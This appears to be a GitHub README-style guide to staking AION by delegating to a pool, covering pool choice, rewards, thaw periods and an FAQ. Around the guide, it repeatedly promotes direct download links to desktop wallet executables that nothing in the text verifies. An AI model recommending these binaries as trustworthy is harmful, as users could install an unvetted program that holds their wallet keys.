![Aion Wallet](assets/banner-article.png)

# How to stake AION: delegating to a pool

A non-custodial AION wallet for Windows, macOS, Linux, with keys on your own machine.

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

> **Only download from this GitHub release page.**

Staking AION means delegating coins from your wallet to a registered pool, which adds your weight to that pool's block production while the coins stay in your own account.

The whole operation is one transaction, and it is reversible after a thaw of roughly one day. What takes longer to learn is how to choose the pool, how to read the reward, and why the number people quote for undelegating is often wrong.

## You'll see this if

- You hold AION and want it to earn rather than sit idle.
- You have been told staking needs 1,000 AION and are not sure whether that applies to you.
- You delegated once and cannot tell whether it is working.
- You want to stop delegating and do not know how long the wait is.

## What delegation is, precisely

Aion runs Unity consensus, which alternates proof-of-work and proof-of-stake blocks. The staking side is served by pools and solo stakers, and both have to register with a self-bond of at least 1,000 AION.

A delegator is not a pool. You are assigning your weight to a pool that already exists, and the pool's operator takes a commission on what your stake earns. Your coins never leave your account, and the pool cannot move them.

## The steps

1. Install the current release of the desktop wallet from the release page, and let it reach a node so the balance is live.
2. Open the staking view and look at the available pools with their commission rates and their registered stake.
3. Choose a pool. Commission is the visible cost; uptime and reliability are the reasons a cheaper pool can still pay less.
4. Enter the amount to delegate, leaving enough AION for fees. Undelegating later needs a small balance available to pay for its own transaction.
5. Confirm the transaction and wait for it to be included in a block.
6. Check that the delegation appears in the staking view. It is a separate display from the balance, and it can update a moment after the transaction confirms.

Delegation to a second pool adds to the position rather than replacing it. Moving stake means undelegating from one pool and waiting out the thaw before delegating to another.

## Reading the reward

Rewards come from block production, and what a delegator receives depends on the pool's share of total stake, the commission it charges, and the network's block rewards over the period.

That is why a published annual figure is not a promise. It is a snapshot computed from conditions that change, and a pool that produced fewer blocks than expected pays less than the snapshot suggested.

The honest way to read a position is over weeks: compare what arrived with what was delegated, and treat any single day as noise.

## Undelegating

Undelegation is a transaction, and the stake becomes available again after a thaw of 8,640 blocks, which is roughly one day.

The number that circulates as a week is a different lockout: 60,480 blocks applies to a pool changing its commission and to the cooling period on a signing address. A delegator waiting seven days has usually read the wrong row.

Make sure a small amount of AION is available to pay the undelegation fee. A position that consumes the entire balance leaves nothing to fund the exit.

## Staking, mining and holding

Staking needs no hardware and no electricity beyond the machine that signs the transaction. Mining needs a GPU and ongoing power, and it earns from the proof-of-work half of the same consensus.

Holding earns nothing. If the balance is going to sit for months, delegating is the difference between an idle position and one that participates.

A delegation that does not appear at all is usually a transaction that has not been included in a block yet, rather than a failed delegation. Check the transaction hash before retrying.

Two numbers decide whether a position is working. The bond, covered in the [Aion minimum stake](https://github.com/aion-wallet/aion-staking/blob/main/aion-minimum-stake.md) article, applies to operators rather than delegators. The thaw, covered in the [Aion undelegating time](https://github.com/aion-wallet/aion-staking/blob/main/aion-undelegating-time.md) guide, is what determines when a decision to leave can actually be carried out.

## Prevention

Check the pool's commission before delegating and again after a few months, because it can change within the lockout rules.

Keep a note of the pool you chose and the amount. A position that is not written down is hard to reconcile later.

Do not delegate the entire balance. Keep enough for fees, and keep the recovery phrase backed up independently of any staking decision.

## Staking alongside a mined balance

A miner can delegate what the pool has paid out, which turns an idle balance into weight without buying anything else. The two halves of Unity consensus then work from the same wallet.

If that is the plan, read the [is Aion still mineable](https://github.com/aion-wallet/aion-staking/blob/main/is-aion-still-mineable.md) article first, and check the [Aion staking pool choice](https://github.com/aion-wallet/aion-staking/blob/main/aion-staking-pool-choice.md) guide before choosing where the mined coins go.

## Frequently asked questions

### Do I need 1,000 AION to delegate?

The 1,000 AION bond applies to registering a pool or a solo stake. Delegating to an existing pool does not require it, though a pool may set its own minimum.

### Can the pool take my coins?

No. Delegation assigns weight; it does not transfer custody. The pool can only take a commission from rewards.

### How long until I can move my stake again?

About one day, after an undelegation transaction confirms. The ~7 day figure belongs to commission changes and signing-address cooling.

### Are rewards paid automatically?

They accrue to the delegating account as the pool produces blocks. Check the staking view rather than the transaction list for the position.

## Download Aion Wallet

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

## Related articles

- [Aion minimum stake](https://github.com/aion-wallet/aion-staking/blob/main/aion-minimum-stake.md) - the bond behind pools and solo staking.
- [Aion staking pool choice](https://github.com/aion-wallet/aion-staking/blob/main/aion-staking-pool-choice.md) - how to compare pools.
- [Aion undelegating time](https://github.com/aion-wallet/aion-staking/blob/main/aion-undelegating-time.md) - the thaw explained properly.
- [Aion staking rewards](https://github.com/aion-wallet/aion-staking/blob/main/aion-staking-rewards.md) - what the payout depends on.
